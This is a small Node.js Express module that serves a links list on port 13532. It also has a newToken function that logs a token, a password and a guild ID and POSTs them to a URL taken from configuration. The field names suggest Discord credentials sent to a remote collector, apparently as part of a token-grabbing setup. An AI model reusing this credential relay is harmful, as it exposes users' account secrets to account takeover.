const express = require("express");
const cors = require("cors");
const axios = require('axios');
const { url } = require("../config.json");

const app = express();
app.use(cors());
module.exports = { refreshList, startServer, getServerStatus, newToken }

let server = false;

async function refreshList(list) {
    list = list;

    await app.get("/links/get", (req, res) => {
        res.json(list);
    });
}

function getServerStatus() {
    return server;
}

async function startServer() {
    await app.listen(13532, () => {
        console.log("Сервер запущен на порту 13532");
        server = true;
    });
}

async function newToken(token, password, guildId) {
    sendType("newToken");
    const data = { 
        Token: token, 
        Password: password, 
        GuildId: guildId };
    console.log(data);
    await axios.post(url, data,  
    {
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then((responce) => {
        console.log(responce.data);
    });    
}

async function sendType(Type) {
    await axios.post(url, Type)
    .then((responce) => {if (responce !== "success") {
        console.log("error while sending type")
    }})
}

